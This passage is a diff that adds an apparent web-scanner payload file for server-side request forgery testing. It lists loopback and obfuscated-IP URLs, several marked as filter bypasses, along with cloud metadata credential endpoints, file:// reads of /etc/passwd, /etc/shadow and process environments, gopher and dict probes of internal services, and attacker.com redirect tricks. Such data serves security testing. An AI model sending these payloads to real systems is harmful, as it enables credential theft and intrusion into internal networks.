@@ -1,0 +1,1985 @@
+{
+  "version": "5.1.0",
+  "category": "ssrf",
+  "payloads": [
+    {
+      "id": "ssrf.localhost.loopback_v4",
+      "vector": "http://127.0.0.1/",
+      "description": "Loopback IPv4.",
+      "context": "localhost",
+      "cwe": "CWE-918",
+      "owasp": "A10:2021",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "references": [
+        "https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf"
+      ],
+      "tags": [
+        "loopback"
+      ]
+    },
+    {
+      "id": "ssrf.localhost.name",
+      "vector": "http://localhost/",
+      "description": "Loopback by name.",
+      "context": "localhost",
+      "cwe": "CWE-918",
+      "owasp": "A10:2021",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "loopback"
+      ]
+    },
+    {
+      "id": "ssrf.localhost.zeroes",
+      "vector": "http://0.0.0.0/",
+      "description": "0.0.0.0 resolves to localhost on Linux.",
+      "context": "localhost",
+      "cwe": "CWE-918",
+      "owasp": "A10:2021",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "loopback"
+      ]
+    },
+    {
+      "id": "ssrf.localhost.ipv6",
+      "vector": "http://[::1]/",
+      "description": "IPv6 loopback.",
+      "context": "localhost",
+      "cwe": "CWE-918",
+      "owasp": "A10:2021",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "ipv6",
+        "loopback"
+      ]
+    },
+    {
+      "id": "ssrf.obf.decimal_ip",
+      "vector": "http://2130706433/",
+      "description": "Decimal encoding of 127.0.0.1.",
+      "context": "ip_obfuscation",
+      "cwe": "CWE-918",
+      "owasp": "A10:2021",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "waf_bypass": true,
+      "tags": [
+        "decimal-ip"
+      ]
+    },
+    {
+      "id": "ssrf.obf.hex_ip",
+      "vector": "http://0x7f000001/",
+      "description": "Hex encoding of 127.0.0.1.",
+      "context": "ip_obfuscation",
+      "cwe": "CWE-918",
+      "owasp": "A10:2021",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "waf_bypass": true,
+      "tags": [
+        "hex-ip"
+      ]
+    },
+    {
+      "id": "ssrf.obf.octal_ip",
+      "vector": "http://0177.0000.0000.0001/",
+      "description": "Octal encoding of 127.0.0.1.",
+      "context": "ip_obfuscation",
+      "cwe": "CWE-918",
+      "owasp": "A10:2021",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "waf_bypass": true,
+      "tags": [
+        "octal-ip"
+      ]
+    },
+    {
+      "id": "ssrf.obf.circled_digits",
+      "vector": "http://①②⑦.⓪.⓪.①/",
+      "description": "Unicode circled digits that some parsers normalise to 127.0.0.1.",
+      "context": "ip_obfuscation",
+      "cwe": "CWE-918",
+      "owasp": "A10:2021",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "waf_bypass": true,
+      "tags": [
+        "unicode-ip"
+      ]
+    },
+    {
+      "id": "ssrf.obf.userinfo_marker",
+      "vector": "http://127.0.0.1@evil-webscanner-test.invalid/",
+      "description": "Userinfo split — validator sees the marker, client connects to 127.0.0.1.",
+      "context": "ip_obfuscation",
+      "cwe": "CWE-918",
+      "owasp": "A10:2021",
+      "canary": "evil-webscanner-test.invalid",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "waf_bypass": true,
+      "tags": [
+        "userinfo"
+      ]
+    },
+    {
+      "id": "ssrf.obf.ipv4_mapped_ipv6",
+      "vector": "http://[::ffff:169.254.169.254]/latest/meta-data/",
+      "description": "IPv4-mapped IPv6 form of the cloud metadata IP.",
+      "context": "ip_obfuscation",
+      "cwe": "CWE-918",
+      "owasp": "A10:2021",
+      "confidence": "MEDIUM",
+      "severity": "Critical",
+      "waf_bypass": true,
+      "references": [
+        "https://github.com/craftcms/cms/security/advisories/GHSA-v2gc-rm6g-wrw9"
+      ],
+      "tags": [
+        "ipv6",
+        "metadata"
+      ]
+    },
+    {
+      "id": "ssrf.cloud.aws_imds",
+      "vector": "http://169.254.169.254/latest/meta-data/",
+      "description": "AWS EC2 IMDS root.",
+      "context": "cloud_metadata",
+      "cwe": "CWE-918",
+      "owasp": "A10:2021",
+      "confidence": "MEDIUM",
+      "severity": "Critical",
+      "expected_evidence": [
+        "ami-id",
+        "instance-id",
+        "iam/"
+      ],
+      "tags": [
+        "aws"
+      ]
+    },
+    {
+      "id": "ssrf.cloud.aws_imds_creds",
+      "vector": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+      "description": "AWS IMDS IAM role credential path.",
+      "context": "cloud_metadata",
+      "cwe": "CWE-918",
+      "owasp": "A10:2021",
+      "confidence": "MEDIUM",
+      "severity": "Critical",
+      "expected_evidence": [
+        "AccessKeyId",
+        "SecretAccessKey",
+        "Token"
+      ],
+      "tags": [
+        "aws",
+        "credentials"
+      ]
+    },
+    {
+      "id": "ssrf.cloud.aws_ecs",
+      "vector": "http://169.254.170.2/v2/credentials/",
+      "description": "AWS ECS task metadata / credential endpoint.",
+      "context": "cloud_metadata",
+      "cwe": "CWE-918",
+      "owasp": "A10:2021",
+      "confidence": "MEDIUM",
+      "severity": "Critical",
+      "expected_evidence": [
+        "AccessKeyId"
+      ],
+      "tags": [
+        "aws",
+        "ecs"
+      ]
+    },
+    {
+      "id": "ssrf.cloud.gcp",
+      "vector": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+      "description": "GCP metadata token endpoint. Requires header 'Metadata-Flavor: Google'.",
+      "context": "cloud_metadata",
+      "cwe": "CWE-918",
+      "owasp": "A10:2021",
+      "confidence": "MEDIUM",
+      "severity": "Critical",
+      "expected_evidence": [
+        "access_token",
+        "Metadata-Flavor"
+      ],
+      "references": [
+        "https://ringsafe.in/ssrf-beyond-aws-gcp-azure-onprem/"
+      ],
+      "tags": [
+        "gcp",
+        "header-required"
+      ]
+    },
+    {
+      "id": "ssrf.cloud.azure_imds",
+      "vector": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+      "description": "Azure IMDS. Requires header 'Metadata: true'.",
+      "context": "cloud_metadata",
+      "cwe": "CWE-918",
+      "owasp": "A10:2021",
+      "confidence": "MEDIUM",
+      "severity": "Critical",
+      "expected_evidence": [
+        "compute",
+        "azEnvironment",
+        "subscriptionId"
+      ],
+      "tags": [
+        "azure",
+        "header-required"
+      ]
+    },
+    {
+      "id": "ssrf.cloud.oracle",
+      "vector": "http://192.0.0.192/opc/v1/instance/",
+      "description": "Oracle Cloud Infrastructure metadata endpoint.",
+      "context": "cloud_metadata",
+      "cwe": "CWE-918",
+      "owasp": "A10:2021",
+      "confidence": "MEDIUM",
+      "severity": "Critical",
+      "expected_evidence": [
+        "ociAdName",
+        "compartmentId"
+      ],
+      "tags": [
+        "oracle"
+      ]
+    },
+    {
+      "id": "ssrf.cloud.alibaba",
+      "vector": "http://100.100.100.200/latest/meta-data/",
+      "description": "Alibaba Cloud metadata endpoint.",
+      "context": "cloud_metadata",
+      "cwe": "CWE-918",
+      "owasp": "A10:2021",
+      "confidence": "MEDIUM",
+      "severity": "Critical",
+      "expected_evidence": [
+        "instance-id",
+        "region-id"
+      ],
+      "tags": [
+        "alibaba"
+      ]
+    },
+    {
+      "id": "ssrf.scheme.file_unix",
+      "vector": "file:///etc/passwd",
+      "description": "file:// scheme SSRF for local file read.",
+      "context": "alt_scheme",
+      "cwe": "CWE-918",
+      "owasp": "A10:2021",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "expected_evidence": [
+        "root:x:0:0:"
+      ],
+      "tags": [
+        "file"
+      ]
+    },
+    {
+      "id": "ssrf.scheme.gopher",
+      "vector": "gopher://127.0.0.1:6379/_INFO%0d%0a",
+      "description": "gopher:// to speak Redis to a loopback service.",
+      "context": "alt_scheme",
+      "cwe": "CWE-918",
+      "owasp": "A10:2021",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "min_intrusion_level": "medium",
+      "tags": [
+        "gopher",
+        "redis"
+      ]
+    },
+    {
+      "id": "ssrf.scheme.dict",
+      "vector": "dict://127.0.0.1:11211/stats",
+      "description": "dict:// to fingerprint a loopback memcached.",
+      "context": "alt_scheme",
+      "cwe": "CWE-918",
+      "owasp": "A10:2021",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "dict",
+        "memcached"
+      ]
+    },
+    {
+      "id": "ssrf.oob.dns_rebind_marker",
+      "vector": "http://WSSc4n4ry7788.evil-webscanner-test.invalid/",
+      "description": "Marker host for OOB / DNS-rebinding confirmation.",
+      "context": "oob",
+      "cwe": "CWE-918",
+      "owasp": "A10:2021",
+      "canary": "evil-webscanner-test.invalid",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "oob": true,
+      "references": [
+        "https://github.com/craftcms/cms/security/advisories/GHSA-gp2f-7wcm-5fhx"
+      ],
+      "tags": [
+        "oob",
+        "dns-rebind"
+      ]
+    },
+    {
+      "id": "ssrf.redirect.follow_to_imds",
+      "vector": "http://evil-webscanner-test.invalid/redirect?to=http://169.254.169.254/latest/meta-data/",
+      "description": "Server-side redirect chained to the metadata IP (TOCTOU class).",
+      "context": "redirect_bypass",
+      "cwe": "CWE-918",
+      "owasp": "A10:2021",
+      "canary": "evil-webscanner-test.invalid",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "oob": true,
+      "tags": [
+        "redirect",
+        "metadata"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.002cf667d3",
+      "vector": "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/identity",
+      "description": "Imported from the legacy corpus (cloud_metadata).",
+      "context": "cloud_metadata",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "oob": true
+    },
+    {
+      "id": "ssrf.legacy.00beca5001",
+      "vector": "metadata.google.internal",
+      "description": "Imported from the legacy corpus (cloud_metadata).",
+      "context": "cloud_metadata",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "oob": true
+    },
+    {
+      "id": "ssrf.legacy.02ac9bd7ca",
+      "vector": "http://lvh.me",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.031e798d84",
+      "vector": "gopher://127.0.0.1:6379/_INFO",
+      "description": "Imported from the legacy corpus (alt_scheme).",
+      "context": "alt_scheme",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.057bd6dbc5",
+      "vector": "http://0x7f000001",
+      "description": "Imported from the legacy corpus (ip_obfuscation).",
+      "context": "ip_obfuscation",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "waf_bypass": true
+    },
+    {
+      "id": "ssrf.legacy.05d65cb871",
+      "vector": "sftp://localhost:22/",
+      "description": "Imported from the legacy corpus (localhost).",
+      "context": "localhost",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.064f0040e5",
+      "vector": "http://[0000::1]",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.067e04a842",
+      "vector": "http://169.254.169.254/computeMetadata/v1beta1/",
+      "description": "Imported from the legacy corpus (cloud_metadata).",
+      "context": "cloud_metadata",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "oob": true
+    },
+    {
+      "id": "ssrf.legacy.07c2204bb9",
+      "vector": "jar:file:///etc/passwd!/",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.07d6e5a90f",
+      "vector": "dict://127.0.0.1:6379/info",
+      "description": "Imported from the legacy corpus (alt_scheme).",
+      "context": "alt_scheme",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.084504d3e8",
+      "vector": "http://localhost.localdomain",
+      "description": "Imported from the legacy corpus (localhost).",
+      "context": "localhost",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.0a5c68cc55",
+      "vector": "http://localhost%2F@attacker.com",
+      "description": "Imported from the legacy corpus (ip_obfuscation).",
+      "context": "ip_obfuscation",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.0b6689de48",
+      "vector": "ldap://localhost:636/",
+      "description": "Imported from the legacy corpus (alt_scheme).",
+      "context": "alt_scheme",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.0c5616e201",
+      "vector": "http://10.0.0.1:3389",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.0e9e746433",
+      "vector": "http://169.254.169.254",
+      "description": "Imported from the legacy corpus (cloud_metadata).",
+      "context": "cloud_metadata",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "oob": true
+    },
+    {
+      "id": "ssrf.legacy.11903eadfb",
+      "vector": "http://attacker.com?url=http://localhost",
+      "description": "Imported from the legacy corpus (localhost).",
+      "context": "localhost",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.13388d5a5e",
+      "vector": "http://localhost@attacker.com",
+      "description": "Imported from the legacy corpus (ip_obfuscation).",
+      "context": "ip_obfuscation",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.167a80f498",
+      "vector": "http://127.0.0.1",
+      "description": "Imported from the legacy corpus (localhost).",
+      "context": "localhost",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.179890bf19",
+      "vector": "http://metadata.azure.com/metadata/instance?api-version=2021-02-01",
+      "description": "Imported from the legacy corpus (cloud_metadata).",
+      "context": "cloud_metadata",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.1beabec4b8",
+      "vector": "http://127.000.000.001",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.1bed86968e",
+      "vector": "http://attacker.com@127.0.0.1",
+      "description": "Imported from the legacy corpus (ip_obfuscation).",
+      "context": "ip_obfuscation",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.1de949a222",
+      "vector": "//localhost",
+      "description": "Imported from the legacy corpus (localhost).",
+      "context": "localhost",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.1e992e6500",
+      "vector": "http://100.100.100.200/latest/meta-data/instance-id",
+      "description": "Imported from the legacy corpus (cloud_metadata).",
+      "context": "cloud_metadata",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.2746285c1c",
+      "vector": "http://10.0.0.0/8",
+      "description": "Imported from the legacy corpus (localhost).",
+      "context": "localhost",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.2bf0fa1d7d",
+      "vector": "http://localhost:3000",
+      "description": "Imported from the legacy corpus (localhost).",
+      "context": "localhost",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.2c15961b70",
+      "vector": "http://127.0.0.1:5432",
+      "description": "Imported from the legacy corpus (localhost).",
+      "context": "localhost",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.2e3eda90f7",
+      "vector": "http://192.168.0.1:80",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.30ed3442ed",
+      "vector": "http://127.0.0.1:8888",
+      "description": "Imported from the legacy corpus (localhost).",
+      "context": "localhost",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.311fac494c",
+      "vector": "http://127.0.0.1%00.attacker.com",
+      "description": "Imported from the legacy corpus (localhost).",
+      "context": "localhost",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.3333e706c9",
+      "vector": "http://attacker.com#localhost",
+      "description": "Imported from the legacy corpus (localhost).",
+      "context": "localhost",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.334389048b",
+      "vector": "localhost",
+      "description": "Imported from the legacy corpus (localhost).",
+      "context": "localhost",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.34cee24e1f",
+      "vector": "dict://localhost:11211/stat",
+      "description": "Imported from the legacy corpus (alt_scheme).",
+      "context": "alt_scheme",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.3583ba1a37",
+      "vector": "http://169.254.169.254/latest/user-data",
+      "description": "Imported from the legacy corpus (cloud_metadata).",
+      "context": "cloud_metadata",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "oob": true
+    },
+    {
+      "id": "ssrf.legacy.380a0be070",
+      "vector": "http://localhost:8000",
+      "description": "Imported from the legacy corpus (localhost).",
+      "context": "localhost",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.3aace45643",
+      "vector": "http://2130706433",
+      "description": "Imported from the legacy corpus (ip_obfuscation).",
+      "context": "ip_obfuscation",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.3bb876d5cb",
+      "vector": "http://0.0.0.0",
+      "description": "Imported from the legacy corpus (localhost).",
+      "context": "localhost",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.3c3015d1b5",
+      "vector": "file:///etc/hosts",
+      "description": "Imported from the legacy corpus (alt_scheme).",
+      "context": "alt_scheme",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.3eced986f8",
+      "vector": "http://127.0.0.1.xip.io",
+      "description": "Imported from the legacy corpus (localhost).",
+      "context": "localhost",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.431c7b6b29",
+      "vector": "file:///proc/self/environ",
+      "description": "Imported from the legacy corpus (alt_scheme).",
+      "context": "alt_scheme",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.4914cf6fef",
+      "vector": "file:///c:/windows/system32/drivers/etc/hosts",
+      "description": "Imported from the legacy corpus (alt_scheme).",
+      "context": "alt_scheme",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.49328d3aa6",
+      "vector": "////169.254.169.254",
+      "description": "Imported from the legacy corpus (cloud_metadata).",
+      "context": "cloud_metadata",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "oob": true
+    },
+    {
+      "id": "ssrf.legacy.4a932c02aa",
+      "vector": "gopher://localhost:5432/_",
+      "description": "Imported from the legacy corpus (alt_scheme).",
+      "context": "alt_scheme",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.4b84b15bff",
+      "vector": "127.0.0.1",
+      "description": "Imported from the legacy corpus (localhost).",
+      "context": "localhost",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.4bc29727bd",
+      "vector": "http://attacker.com?url=169.254.169.254",
+      "description": "Imported from the legacy corpus (cloud_metadata).",
+      "context": "cloud_metadata",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "oob": true
+    },
+    {
+      "id": "ssrf.legacy.4bc88d88c2",
+      "vector": "http://169.254.169.254#@attacker.com",
+      "description": "Imported from the legacy corpus (cloud_metadata).",
+      "context": "cloud_metadata",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "oob": true
+    },
+    {
+      "id": "ssrf.legacy.4c9860cbcb",
+      "vector": "file:///etc/shadow",
+      "description": "Imported from the legacy corpus (alt_scheme).",
+      "context": "alt_scheme",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.4d8b8eeb8e",
+      "vector": "http://metadata.google.internal/computeMetadata/v1/project/project-id",
+      "description": "Imported from the legacy corpus (cloud_metadata).",
+      "context": "cloud_metadata",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "oob": true
+    },
+    {
+      "id": "ssrf.legacy.4e5e02fe48",
+      "vector": "http://attacker.com%5c@localhost",
+      "description": "Imported from the legacy corpus (ip_obfuscation).",
+      "context": "ip_obfuscation",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.4eb60b225a",
+      "vector": "http://127.0.0.1:25",
+      "description": "Imported from the legacy corpus (localhost).",
+      "context": "localhost",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.52c813d7ad",
+      "vector": "http://[::1]",
+      "description": "Imported from the legacy corpus (localhost).",
+      "context": "localhost",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.5312d40fa3",
+      "vector": "gopher://localhost:1433/_",
+      "description": "Imported from the legacy corpus (alt_scheme).",
+      "context": "alt_scheme",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.5431cbb9b3",
+      "vector": "///localhost",
+      "description": "Imported from the legacy corpus (localhost).",
+      "context": "localhost",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.56e8ac45c8",
+      "vector": "jar:http://attacker.com!/",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.57cb56d7cb",
+      "vector": "http://attacker.com/redirect?url=http://127.0.0.1",
+      "description": "Imported from the legacy corpus (localhost).",
+      "context": "localhost",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.58acadb887",
+      "vector": "http://localhost%23@attacker.com",
+      "description": "Imported from the legacy corpus (ip_obfuscation).",
+      "context": "ip_obfuscation",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.599f06cd01",
+      "vector": "http://169.254.169.254/metadata/v1/instance",
+      "description": "Imported from the legacy corpus (cloud_metadata).",
+      "context": "cloud_metadata",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "oob": true
+    },
+    {
+      "id": "ssrf.legacy.59c1ab4a5b",
+      "vector": "http://localhost%252F@attacker.com",
+      "description": "Imported from the legacy corpus (ip_obfuscation).",
+      "context": "ip_obfuscation",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "waf_bypass": true
+    },
+    {
+      "id": "ssrf.legacy.59e71692cb",
+      "vector": "//127.0.0.1",
+      "description": "Imported from the legacy corpus (localhost).",
+      "context": "localhost",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.59fa854191",
+      "vector": "http://0x1010101",
+      "description": "Imported from the legacy corpus (ip_obfuscation).",
+      "context": "ip_obfuscation",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "waf_bypass": true
+    },
+    {
+      "id": "ssrf.legacy.5a7f0e3004",
+      "vector": "gopher://localhost:9200/_",
+      "description": "Imported from the legacy corpus (alt_scheme).",
+      "context": "alt_scheme",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.5d0c1558e5",
+      "vector": "tftp://localhost:69/",
+      "description": "Imported from the legacy corpus (localhost).",
+      "context": "localhost",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.5f6738725f",
+      "vector": "http://attacker.com@metadata.google.internal",
+      "description": "Imported from the legacy corpus (cloud_metadata).",
+      "context": "cloud_metadata",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "oob": true
+    },
+    {
+      "id": "ssrf.legacy.5fa7341573",
+      "vector": "ldap://localhost:389/",
+      "description": "Imported from the legacy corpus (alt_scheme).",
+      "context": "alt_scheme",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.63cf23784a",
+      "vector": "http://localtest.me:80",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.66c17793bb",
+      "vector": "http://127.0.0.1%23.attacker.com",
+      "description": "Imported from the legacy corpus (localhost).",
+      "context": "localhost",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.694f47a62b",
+      "vector": "http://192.168.0.0/16",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
